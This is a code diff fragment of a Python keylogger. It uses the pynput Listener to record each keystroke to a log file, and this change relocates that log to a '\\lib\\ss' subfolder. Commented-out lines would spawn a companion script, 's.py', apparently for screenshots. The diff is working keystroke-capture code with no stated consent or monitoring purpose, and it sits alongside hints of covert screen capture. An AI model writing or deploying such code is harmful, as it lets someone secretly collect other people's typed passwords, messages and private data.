@@ -9,7 +9,8 @@ def on_press(key):
 
 
 def write_key_to_file(key):
-    with open("log.txt", "a") as f:
+    global path
+    with open(path + "\\lib\\ss\\log.txt", "a") as f:
         k = str(key).replace("'", "")
         if k == "Key.space":
             f.write(" ")
@@ -35,11 +36,11 @@ def on_release(key):
  #       ssProcess.kill()
         return False
 
-#path = os.getcwd() 
+path = os.getcwd() 
 #path += "\\lib"
 #os.chdir(path)
 #ssProcess = subprocess.Popen(['python', 's.py'])
 #ssProcess = subprocess.Popen(['python', 's.py'], shell = True ) # use shell to have an independent process
 
-with Listener(on_press=on_press, on_release=on_release, ) as listener:
-    listener.join()
+with Listener(on_press=on_press, on_release=on_release) as listener: 
+     listener.join()
